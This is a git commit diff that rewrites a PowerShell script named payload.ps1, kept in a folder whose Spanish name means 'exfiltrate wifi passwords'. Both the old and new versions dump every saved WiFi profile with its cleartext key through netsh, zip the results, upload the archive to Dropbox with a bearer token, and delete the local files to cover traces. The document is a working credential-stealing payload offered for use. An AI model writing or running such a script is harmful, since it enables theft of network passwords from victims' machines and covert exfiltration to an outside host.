393b9c8d17b3bbe569c5119aea6e7fa1c583f686
flippemen <99625153+dolaraso@users.noreply.github.com>
2024-07-16 14:08:41 -0500

    Update payload.ps1

--- exfiltrar contrasenas wifi/payload.ps1
+++ exfiltrar contrasenas wifi/payload.ps1
@@ -1,24 +1,32 @@
-param(
-    [string]$AccessToken
-)
+function DropBox-Upload {
+    [CmdletBinding()]
+    param (
+        [Parameter(Mandatory = $true, ValueFromPipeline = $true)]
+        [Alias("f")]
+        [string]$SourceFilePath
+    )
+    $outputFile = Split-Path $SourceFilePath -leaf
+    $TargetFilePath = "/$outputFile"
+    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
+    $authorization = "Bearer " + $db
+    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+    $headers.Add("Authorization", $authorization)
+    $headers.Add("Dropbox-API-Arg", $arg)
+    $headers.Add("Content-Type", 'application/octet-stream')
+    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+}
 
-$folderDateTime = (Get-Date).ToString('yyyy-MM-dd_HH-mm-ss');
-$userDir = (Get-Item env:\userprofile).Value + '\Documents\Networks_' + $folderDateTime;
-New-Item -Path $userDir -ItemType Directory;
-netsh wlan show profiles | Select-String ": " | % { $_.ToString().Split(":")[1].Trim() } | % {
-    netsh wlan show profile name=$_ key=clear | Out-File -FilePath ($userDir + '\' + $_ + '.txt')
-};
-Compress-Archive -Path $userDir -DestinationPath ($userDir + '.zip');
-Start-Sleep -s 5;
-Copy-Item -Path ($userDir + '.zip') -Destination 'C:\Users\Public\';
-Remove-Item -Path $userDir -Recurse;
-
-$hookurl = "https://content.dropboxapi.com/2/files/upload";
-$file = "C:\Users\Public\" + ($userDir.Split('\')[-1]) + ".zip";
-$headers = @{
-    Authorization = "Bearer $AccessToken";
-    "Content-Type" = "application/octet-stream";
-    "Dropbox-API-Arg" = "{""path"": ""/Networks.zip"", ""mode"": ""add"", ""autorename"": true}"
-};
-Invoke-RestMethod -Uri $hookurl -Method Post -Headers $headers -InFile $file;
-Remove-Item -Path $file;
+# Extracción y carga de contraseñas WiFi
+$db = ''
+$folderDateTime = (Get-Date).ToString('yyyy-MM-dd_HH-mm-ss')
+$userDir = "$env:USERPROFILE\Documents\Networks_$folderDateTime"
+New-Item -Path $userDir -ItemType Directory
+netsh wlan show profiles | Select-String ": " | ForEach-Object {
+    $profileName = $_.ToString().Split(":")[1].Trim()
+    netsh wlan show profile name=$profileName key=clear | Out-File -FilePath "$userDir\$profileName.txt"
+}
+Compress-Archive -Path $userDir -DestinationPath "$userDir.zip"
+Start-Sleep -s 5
+if (-not ([string]::IsNullOrEmpty($db))) { DropBox-Upload -f "$userDir.zip" }
+Remove-Item -Path $userDir -Recurse
+Remove-Item -Path "$userDir.zip"
